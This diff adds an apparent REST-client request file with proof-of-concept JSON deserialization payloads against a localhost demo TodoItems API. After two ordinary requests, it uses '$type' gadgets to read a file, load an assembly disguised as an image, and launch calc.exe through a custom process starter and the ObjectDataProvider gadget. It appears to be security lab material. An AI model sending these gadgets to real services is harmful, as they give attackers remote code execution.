@@ -1,0 +1,97 @@
+@hostname=localhost
+@port=7040
+
+###
+
+GET https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+
+###
+
+POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "walk dog1",
+  "isComplete": true,
+  "metadata":
+    {
+        "data2": 123
+    }
+}
+
+###
+
+# Test if a file can be read
+POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "walk dog1",
+  "isComplete": true,
+  "metadata":
+    {
+        "data2": {
+		"$type": "System.IO.FileInfo, System.IO.FileSystem",
+		"fileName": "rce-test.txt"
+	}
+    }
+}
+
+###
+
+# Load the assembly
+POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "load assembly",
+  "isComplete": true,
+  "metadata":
+    {
+        "data2":  {"$type":"System.Configuration.Install.AssemblyInstaller, 
+            System.Configuration.Install",
+            "Path":"someimage.png"}
+    }
+}
+###
+
+# Execute the exploit -- launch calc
+POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "launch calc",
+  "isComplete": true,
+  "metadata":
+    {
+        "launchdata":  
+ {"$type":"MaliciousAssembly.ProcessStarter, MaliciousAssembly",
+            "ProcessLaunch":"calc.exe"
+            }
+    }
+}
+
+###
+
+# Does not work in .NET 8
+POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "pwn with ObjectDataProvider",
+  "metadata" : 
+  {
+    "fido": 
+    {
+        '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+        'MethodName':'Start',
+        'MethodParameters':{
+            '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+            '$values':['cmd','/ccalc']
+        },
+        'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+    }
+  }
+}
+
+###
